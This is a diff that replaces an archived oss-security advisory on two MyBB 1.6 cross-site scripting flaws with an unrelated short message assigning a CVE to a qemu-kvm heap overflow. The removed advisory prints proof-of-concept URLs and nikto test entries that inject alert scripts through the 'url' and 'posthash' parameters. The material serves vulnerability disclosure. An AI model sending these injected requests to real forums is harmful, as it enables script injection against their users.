@@ -1,105 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/7
-Message-ID: <AANLkTim6g4-8hbtUewtY-=yOKt9H=X79KeCpE_OvDEEa@mail.gmail.com>
-Date: Fri, 18 Mar 2011 14:17:35 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: MyBB 1.6 <= Cross Site Scripting Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/04/25/6
+Message-ID: <1576686929.150732.1303761665047.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Mon, 25 Apr 2011 16:01:05 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
+To: oss-security@...ts.openwall.com, Petr Matousek <pmatouse@...hat.com>
+Cc: coley@...us.mitre.org
+Subject: Re: CVE request -- qemu-kvm: virtio-blk: heap buffer overflow caused by unaligned requests
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
+----- Original Message -----
+> "It was found that virtio-blk driver in qemu-kvm did not properly
+> validate read and write requests from the guest. A privileged guest user
+> could use this flaw to cause heap corruption, causing the guest to crash
+> (denial of service) or, possibly, resulting in the privileged guest user
+> escalating their privileges on the host."
+> 
+> References:
+> http://www.spinics.net/lists/kvm/msg51877.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=698906
+> 
+> Upstream commit:
+> http://git.kernel.org/?p=virt/kvm/qemu-kvm.git;a=commit;h=52c050236eaa4f0b5e1d160cd66dc18106445c4d
+> 
 
-MyBB was vulnerable to Cross Site Scripting.
+Please use CVE-2011-1750.
 
+Thanks.
 
-2. APPLICATION DESCRIPTION
-
-MyBB is a free bulletin board system software package developed by the
-MyBB Group.
-It's supposed to be developed from XMB and DevBB bulletin board applications.
-
-
-3. VULNERABILITY DESCRIPTION
-
-Two XSS vulnerabilities were found. One is user-driven XSS on "url" parameter.
-User will get xssed upon successful log-in.
-The other is a reflected XSS on "posthash" parameter where the valid
-tid (topic id) is required for successful attack.
-The anti-CSRF check against "my_post_key" parameter was not done in
-thread/post preview mode and thus there came a way for XSS to be
-successful.
-
-
-4. VERSIONS AFFECTED
-
-MyBB 1.6 and lower
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-User-driven XSS
-http://attacker.in/mybb/member.php?action=login&url=javascript:alert%28/XSS/%29
-
-Reflected XSS
-http://attacker.in/mybb/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash="><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
-Post
-
-Or try nikto udb_tests
-
-"400003","0","4","/member.php?action=login&url=javascript:alert(/XSS/)","GET","<input
-type=\"hidden\" name=\"url\" value=\"javascript:alert(/XSS/)\"
-/>","","","<input type="hidden" name="url" value=\"\" />","","MyBB 1.6
-<= Cross Site Scripting,  ref:
-http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
-
-"400004","0","4","/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash=\"><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
-Post","GET","<input type="hidden" name="posthash"
-value=""><script>alert(/XSS/)</script>" />","","","<input
-type="hidden" name="url" value=\"\" />","","MyBB 1.6 <= Cross Site
-Scripting,  ref:
-http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
-
-
-6. SOLUTION
-
-Upgrade to 1.6.1
-
-
-7. VENDOR
-
-MyBB Development Team
-http://www.mybb.com/
-
-
-8. CREDIT
-
-This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2010-12-09: notified vendor
-2010-12-15: vendor released fixed version
-2010-12-20: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting
-Vendor ChangeLog:
-http://blog.mybb.com/2010/12/15/mybb-1-6-1-release-1-4-14-update/
-About MyBB: http://www.mybb.com/about/mybb
-
-
-#yehg [2010-12-20]
-
-#last updated at 2010-12-23
----------------------------------
-Best regards,
-YGN Ethical Hacker Group
-Yangon, Myanmar
-http://yehg.net
-Our Lab | http://yehg.net/lab
-Our Directory | http://yehg.net/hwd
+-- 
+    JB
